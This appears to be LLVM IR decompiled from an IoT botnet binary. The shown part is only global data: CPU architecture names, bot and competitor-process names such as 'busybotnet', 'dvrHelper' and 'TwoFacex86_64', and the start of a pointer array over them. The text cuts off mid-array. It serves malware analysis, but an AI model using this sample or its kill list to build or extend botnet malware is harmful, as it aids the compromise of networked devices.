source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208004013
@global_var_1001d050.3 = global i32 0
@global_var_1001d05c.4 = local_unnamed_addr global i32* @global_var_1001d050.3
@global_var_1001d8a4.7 = global i32 0
@global_var_1001d054.8 = global i32 0
@global_var_1000aee0.12 = constant [5 x i8] c"mips\00"
@global_var_1000aee8.13 = constant [7 x i8] c"mips64\00"
@global_var_1000aef0.14 = constant [7 x i8] c"mipsel\00"
@global_var_1000aef8.15 = constant [6 x i8] c"sh2eb\00"
@global_var_1000af00.16 = constant [7 x i8] c"sh2elf\00"
@global_var_1000af08.17 = constant [4 x i8] c"sh4\00"
@global_var_1000af0c.18 = constant [4 x i8] c"x86\00"
@global_var_1000af10.19 = constant [4 x i8] c"arm\00"
@global_var_1000af14.20 = constant [6 x i8] c"armv5\00"
@global_var_1000af1c.21 = constant [8 x i8] c"armv4tl\00"
@global_var_1000af24.22 = constant [6 x i8] c"armv4\00"
@global_var_1000af2c.23 = constant [6 x i8] c"armv6\00"
@global_var_1000af34.24 = constant [5 x i8] c"i686\00"
@global_var_1000af3c.25 = constant [8 x i8] c"powerpc\00"
@global_var_1000af44.26 = constant [13 x i8] c"powerpc440fp\00"
@global_var_1000af54.27 = constant [5 x i8] c"i586\00"
@global_var_1000af5c.28 = constant [5 x i8] c"m68k\00"
@global_var_1000af64.29 = constant [6 x i8] c"sparc\00"
@global_var_1000af6c.30 = constant [7 x i8] c"x86_64\00"
@global_var_1000af74.31 = constant [11 x i8] c"jackmymips\00"
@global_var_1000af80.32 = constant [13 x i8] c"jackmymips64\00"
@global_var_1000af90.33 = constant [13 x i8] c"jackmymipsel\00"
@global_var_1000afa0.34 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_1000afac.35 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_1000afbc.36 = constant [10 x i8] c"jackmysh4\00"
@global_var_1000afc8.37 = constant [10 x i8] c"jackmyx86\00"
@global_var_1000afd4.38 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_1000afe0.39 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_1000aff0.40 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_1000affc.41 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_1000b008.42 = constant [11 x i8] c"jackmyi686\00"
@global_var_1000b014.43 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_1000b024.44 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_1000b038.45 = constant [11 x i8] c"jackmyi586\00"
@global_var_1000b044.46 = constant [11 x i8] c"jackmym68k\00"
@global_var_1000b050.47 = constant [12 x i8] c"jackmysparc\00"
@global_var_1000b05c.48 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_1000b06c.49 = constant [11 x i8] c"hackmymips\00"
@global_var_1000b078.50 = constant [13 x i8] c"hackmymips64\00"
@global_var_1000b088.51 = constant [13 x i8] c"hackmymipsel\00"
@global_var_1000b098.52 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_1000b0a4.53 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_1000b0b4.54 = constant [10 x i8] c"hackmysh4\00"
@global_var_1000b0c0.55 = constant [10 x i8] c"hackmyx86\00"
@global_var_1000b0cc.56 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_1000b0d8.57 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_1000b0e8.58 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_1000b0f4.59 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_1000b100.60 = constant [11 x i8] c"hackmyi686\00"
@global_var_1000b10c.61 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_1000b11c.62 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_1000b130.63 = constant [11 x i8] c"hackmyi586\00"
@global_var_1000b13c.64 = constant [11 x i8] c"hackmym68k\00"
@global_var_1000b148.65 = constant [12 x i8] c"hackmysparc\00"
@global_var_1000b154.66 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_1000b164.67 = constant [3 x i8] c"b1\00"
@global_var_1000b168.68 = constant [3 x i8] c"b2\00"
@global_var_1000b16c.69 = constant [3 x i8] c"b3\00"
@global_var_1000b170.70 = constant [3 x i8] c"b4\00"
@global_var_1000b174.71 = constant [3 x i8] c"b5\00"
@global_var_1000b178.72 = constant [3 x i8] c"b6\00"
@global_var_1000b17c.73 = constant [3 x i8] c"b7\00"
@global_var_1000b180.74 = constant [3 x i8] c"b8\00"
@global_var_1000b184.75 = constant [3 x i8] c"b9\00"
@global_var_1000b188.76 = constant [4 x i8] c"b10\00"
@global_var_1000b18c.77 = constant [4 x i8] c"b11\00"
@global_var_1000b190.78 = constant [4 x i8] c"b12\00"
@global_var_1000b194.79 = constant [4 x i8] c"b13\00"
@global_var_1000b198.80 = constant [4 x i8] c"b14\00"
@global_var_1000b19c.81 = constant [4 x i8] c"b15\00"
@global_var_1000b1a0.82 = constant [4 x i8] c"b16\00"
@global_var_1000b1a4.83 = constant [4 x i8] c"b17\00"
@global_var_1000b1a8.84 = constant [4 x i8] c"b18\00"
@global_var_1000b1ac.85 = constant [4 x i8] c"b19\00"
@global_var_1000b1b0.86 = constant [4 x i8] c"b20\00"
@global_var_1000b1b4.87 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1000b1c8.88 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1000b1d4.89 = constant [10 x i8] c"dvrHelper\00"
@global_var_1000b1e0.90 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1000b1e8.91 = constant [5 x i8] c"FEUB\00"
@global_var_1000b1f0.92 = constant [9 x i8] c"FTUdftui\00"
@global_var_1000b1fc.93 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1000b208.94 = constant [6 x i8] c"jhUOH\00"
@global_var_1000b210.95 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1000b21c.96 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1000b228.97 = constant [8 x i8] c"kmymips\00"
@global_var_1000b230.98 = constant [10 x i8] c"kmymips64\00"
@global_var_1000b23c.99 = constant [10 x i8] c"kmymipsel\00"
@global_var_1000b248.100 = constant [9 x i8] c"kmysh2eb\00"
@global_var_1000b254.101 = constant [10 x i8] c"kmysh2elf\00"
@global_var_1000b260.102 = constant [7 x i8] c"kmysh4\00"
@global_var_1000b268.103 = constant [7 x i8] c"kmyx86\00"
@global_var_1000b270.104 = constant [9 x i8] c"kmyarmv5\00"
@global_var_1000b27c.105 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_1000b288.106 = constant [9 x i8] c"kmyarmv4\00"
@global_var_1000b294.107 = constant [9 x i8] c"kmyarmv6\00"
@global_var_1000b2a0.108 = constant [8 x i8] c"kmyi686\00"
@global_var_1000b2a8.109 = constant [11 x i8] c"kmypowerpc\00"
@global_var_1000b2b4.110 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_1000b2c4.111 = constant [8 x i8] c"kmyi586\00"
@global_var_1000b2cc.112 = constant [8 x i8] c"kmym68k\00"
@global_var_1000b2d4.113 = constant [9 x i8] c"kmysparc\00"
@global_var_1000b2e0.114 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1000b2ec.115 = constant [8 x i8] c"lolmips\00"
@global_var_1000b2f4.116 = constant [10 x i8] c"lolmips64\00"
@global_var_1000b300.117 = constant [10 x i8] c"lolmipsel\00"
@global_var_1000b30c.118 = constant [9 x i8] c"lolsh2eb\00"
@global_var_1000b318.119 = constant [10 x i8] c"lolsh2elf\00"
@global_var_1000b324.120 = constant [7 x i8] c"lolsh4\00"
@global_var_1000b32c.121 = constant [7 x i8] c"lolx86\00"
@global_var_1000b334.122 = constant [9 x i8] c"lolarmv5\00"
@global_var_1000b340.123 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_1000b34c.124 = constant [9 x i8] c"lolarmv4\00"
@global_var_1000b358.125 = constant [9 x i8] c"lolarmv6\00"
@global_var_1000b364.126 = constant [8 x i8] c"loli686\00"
@global_var_1000b36c.127 = constant [11 x i8] c"lolpowerpc\00"
@global_var_1000b378.128 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_1000b388.129 = constant [8 x i8] c"loli586\00"
@global_var_1000b390.130 = constant [8 x i8] c"lolm68k\00"
@global_var_1000b398.131 = constant [9 x i8] c"lolsparc\00"
@global_var_1000b3a4.132 = constant [8 x i8] c"RYrydry\00"
@global_var_1000b3ac.133 = constant [8 x i8] c"telmips\00"
@global_var_1000b3b4.134 = constant [10 x i8] c"telmips64\00"
@global_var_1000b3c0.135 = constant [10 x i8] c"telmipsel\00"
@global_var_1000b3cc.136 = constant [9 x i8] c"telsh2eb\00"
@global_var_1000b3d8.137 = constant [10 x i8] c"telsh2elf\00"
@global_var_1000b3e4.138 = constant [7 x i8] c"telsh4\00"
@global_var_1000b3ec.139 = constant [7 x i8] c"telx86\00"
@global_var_1000b3f4.140 = constant [9 x i8] c"telarmv5\00"
@global_var_1000b400.141 = constant [11 x i8] c"telarmv4tl\00"
@global_var_1000b40c.142 = constant [9 x i8] c"telarmv4\00"
@global_var_1000b418.143 = constant [9 x i8] c"telarmv6\00"
@global_var_1000b424.144 = constant [8 x i8] c"teli686\00"
@global_var_1000b42c.145 = constant [11 x i8] c"telpowerpc\00"
@global_var_1000b438.146 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_1000b448.147 = constant [8 x i8] c"teli586\00"
@global_var_1000b450.148 = constant [8 x i8] c"telm68k\00"
@global_var_1000b458.149 = constant [9 x i8] c"telsparc\00"
@global_var_1000b464.150 = constant [10 x i8] c"telx86_64\00"
@global_var_1000b470.151 = constant [12 x i8] c"TwoFacemips\00"
@global_var_1000b47c.152 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_1000b48c.153 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_1000b49c.154 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_1000b4ac.155 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_1000b4bc.156 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_1000b4c8.157 = constant [11 x i8] c"TwoFacex86\00"
@global_var_1000b4d4.158 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_1000b4e4.159 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_1000b4f4.160 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_1000b504.161 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_1000b514.162 = constant [12 x i8] c"TwoFacei686\00"
@global_var_1000b520.163 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_1000b530.164 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_1000b544.165 = constant [12 x i8] c"TwoFacei586\00"
@global_var_1000b550.166 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_1000b55c.167 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_1000b56c.168 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_1000b57c.169 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1000b588.170 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1000b594.171 = constant [5 x i8] c"xxb1\00"
@global_var_1000b59c.172 = constant [5 x i8] c"xxb2\00"
@global_var_1000b5a4.173 = constant [5 x i8] c"xxb3\00"
@global_var_1000b5ac.174 = constant [5 x i8] c"xxb4\00"
@global_var_1000b5b4.175 = constant [5 x i8] c"xxb5\00"
@global_var_1000b5bc.176 = constant [5 x i8] c"xxb6\00"
@global_var_1000b5c4.177 = constant [5 x i8] c"xxb7\00"
@global_var_1000b5cc.178 = constant [5 x i8] c"xxb8\00"
@global_var_1000b5d4.179 = constant [5 x i8] c"xxb9\00"
@global_var_1000b5dc.180 = constant [6 x i8] c"xxb10\00"
@global_var_1000b5e4.181 = constant [6 x i8] c"xxb11\00"
@global_var_1000b5ec.182 = constant [6 x i8] c"xxb12\00"
@global_var_1000b5f4.183 = constant [6 x i8] c"xxb13\00"
@global_var_1000b5fc.184 = constant [6 x i8] c"xxb14\00"
@global_var_1000b604.185 = constant [6 x i8] c"xxb15\00"
@global_var_1000b60c.186 = constant [6 x i8] c"xxb16\00"
@global_var_1000b614.187 = constant [6 x i8] c"xxb17\00"
@global_var_1000b61c.188 = constant [6 x i8] c"xxb18\00"
@global_var_1000b624.189 = constant [6 x i8] c"xxb19\00"
@global_var_1000b62c.190 = constant [6 x i8] c"xxb20\00"
@global_var_1000b634.191 = constant i32 822083584
@global_var_1000b638.192 = constant i32 838860800
@global_var_1000b63c.193 = constant i32 855638016
@global_var_1000b640.194 = constant i32 872415232
@global_var_1000b644.195 = constant i32 889192448
@global_var_1000b648.196 = constant i32 905969664
@global_var_1000b64c.197 = constant i32 922746880
@global_var_1000b650.198 = constant i32 939524096
@global_var_1000b654.199 = constant i32 956301312
@global_var_1000b658.200 = constant [3 x i8] c"10\00"
@global_var_1000b65c.201 = constant [3 x i8] c"11\00"
@global_var_1000b660.202 = constant [3 x i8] c"12\00"
@global_var_1000b664.203 = constant [3 x i8] c"13\00"
@global_var_1000b668.204 = constant [3 x i8] c"14\00"
@global_var_1000b66c.205 = constant [3 x i8] c"15\00"
@global_var_1000b670.206 = constant [3 x i8] c"16\00"
@global_var_1000b674.207 = constant [3 x i8] c"17\00"
@global_var_1000b678.208 = constant [3 x i8] c"18\00"
@global_var_1000b67c.209 = constant [3 x i8] c"19\00"
@global_var_1000b680.210 = constant [3 x i8] c"20\00"
@global_var_1000b684.211 = constant [3 x i8] c"bb\00"
@global_var_1000b688.212 = constant [11 x i8] c"busybotnet\00"
@global_var_1000b694.213 = constant [5 x i8] c"pppd\00"
@global_var_1000b69c.214 = constant [6 x i8] c"pppoe\00"
@global_var_1000b6a4.215 = constant [5 x i8] c"wput\00"
@global_var_1000b6ac.216 = constant [3 x i8] c"B1\00"
@global_var_1000b6b0.217 = constant [3 x i8] c"B2\00"
@global_var_1000b6b4.218 = constant [3 x i8] c"B3\00"
@global_var_1000b6b8.219 = constant [3 x i8] c"B4\00"
@global_var_1000b6bc.220 = constant [3 x i8] c"B5\00"
@global_var_1000b6c0.221 = constant [3 x i8] c"B6\00"
@global_var_1000b6c4.222 = constant [3 x i8] c"B7\00"
@global_var_1000b6c8.223 = constant [3 x i8] c"B8\00"
@global_var_1000b6cc.224 = constant [3 x i8] c"B9\00"
@global_var_1000b6d0.225 = constant [4 x i8] c"B10\00"
@global_var_1000b6d4.226 = constant [4 x i8] c"B11\00"
@global_var_1000b6d8.227 = constant [4 x i8] c"B12\00"
@global_var_1000b6dc.228 = constant [4 x i8] c"B13\00"
@global_var_1000b6e0.229 = constant [4 x i8] c"B14\00"
@global_var_1000b6e4.230 = constant [4 x i8] c"B15\00"
@global_var_1000b6e8.231 = constant [4 x i8] c"B16\00"
@global_var_1000b6ec.232 = constant [4 x i8] c"B17\00"
@global_var_1000b6f0.233 = constant [4 x i8] c"B18\00"
@global_var_1000b6f4.234 = constant [9 x i8] c"B20hackz\00"
@global_var_1000b700.235 = constant [5 x i8] c"bin*\00"
@global_var_1000b708.236 = constant [5 x i8] c"gtop\00"
@global_var_1000b710.237 = constant [5 x i8] c"ftp*\00"
@global_var_1000b718.238 = constant [6 x i8] c"tftp*\00"
@global_var_1000b720.239 = constant [7 x i8] c"botnet\00"
@global_var_1000b728.240 = constant [8 x i8] c"swatnet\00"
@global_var_1000b730.241 = constant [8 x i8] c"ballpit\00"
@global_var_1000b738.242 = constant [8 x i8] c"fucknet\00"
@global_var_1000b740.243 = constant [9 x i8] c"cracknet\00"
@global_var_1000b74c.244 = constant [8 x i8] c"weednet\00"
@global_var_1000b754.245 = constant [7 x i8] c"gaynet\00"
@global_var_1000b75c.246 = constant [9 x i8] c"queernet\00"
@global_var_1000b768.247 = constant [8 x i8] c"ballnet\00"
@global_var_1000b770.248 = constant [5 x i8] c"unet\00"
@global_var_1000b778.249 = constant [7 x i8] c"yougay\00"
@global_var_1000b780.250 = constant [7 x i8] c"sttftp\00"
@global_var_1000b788.251 = constant [7 x i8] c"sstftp\00"
@global_var_1000b790.252 = constant [7 x i8] c"sbtftp\00"
@global_var_1000b798.253 = constant [6 x i8] c"btftp\00"
@global_var_1000b7a0.254 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1000b7ac.255 = constant [6 x i8] c"bruv*\00"
@global_var_1000b7b4.256 = constant [5 x i8] c"IoT*\00"
@global_var_1000b868.257 = constant [4 x i8] c"STD\00"
@global_var_1001d064.258 = global [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000aee0.12, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000aee8.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000aef0.14, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000aef8.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000af00.16, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000af08.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000af0c.18, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000af10.19, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af14.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000af1c.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af24.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af2c.23, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000af34.24, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000af3c.25, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000af44.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000af54.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000af5c.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af64.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000af6c.30, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000af74.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000af80.32, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000af90.33, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000afa0.34, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000afac.35, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000afbc.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000afc8.37, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000afd4.38, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000afe0.39, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000aff0.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000affc.41, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b008.42, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b014.43, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000b024.44, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b038.45, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b044.46, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b050.47, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b05c.48, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b06c.49, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b078.50, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b088.51, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b098.52, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b0a4.53, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b0b4.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b0c0.55, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b0cc.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b0d8.57, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b0e8.58, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b0f4.59, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b100.60, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b10c.61, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000b11c.62, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b130.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b13c.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b148.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b154.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b164.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b168.68, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b16c.69, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b170.70, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b174.71, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b178.72, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b17c.73, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b180.74, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b184.75, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b188.76, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b18c.77, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b190.78, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b194.79, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b198.80, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b19c.81, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1a0.82, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1a4.83, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1a8.84, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1ac.85, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1b0.86, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1000b1b4.87, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b1c8.88, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b1d4.89, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b1e0.90, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b1e8.91, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b1f0.92, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b1fc.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b208.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b210.95, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b21c.96, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b228.97, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b230.98, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b23c.99, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b248.100, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b254.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b260.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b268.103, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b270.104, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b27c.105, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b288.106, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b294.107, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2a0.108, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b2a8.109, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1000b2b4.110, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2c4.111, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2cc.112, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b2d4.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b2e0.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2ec.115, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b2f4.116, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b300.117, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b30c.118, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b318.119, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b324.120, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b32c.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b334.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b340.123, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b34c.124, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b358.125, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b364.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b36c.127, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1000b378.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b388.129, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b390.130, i32 